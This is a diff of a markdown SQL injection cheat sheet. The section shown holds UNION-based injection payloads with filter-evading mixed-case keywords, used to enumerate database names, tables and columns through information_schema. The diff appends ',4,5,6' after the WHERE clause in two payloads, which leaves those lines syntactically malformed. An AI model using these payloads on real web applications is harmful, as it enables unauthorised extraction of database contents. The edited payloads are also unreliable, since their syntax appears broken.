@@ -50,15 +50,15 @@ SELECT column_name FROM information_schema.columns WHERE table_name='usuarios';
 
 ### 💉 Web Injection: Extract `Database Names`, `Tables of a Database`, `Column Names`
 
-````http
+````html
 ## Database Names
 -1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata 
 
 ## Tables of a Database
--1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[$database] 
+-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[$database],4,5,6
 
 ## Column Names
--1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[$table name] 
+-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[$table name],4,5,6
 ````
 
 ---
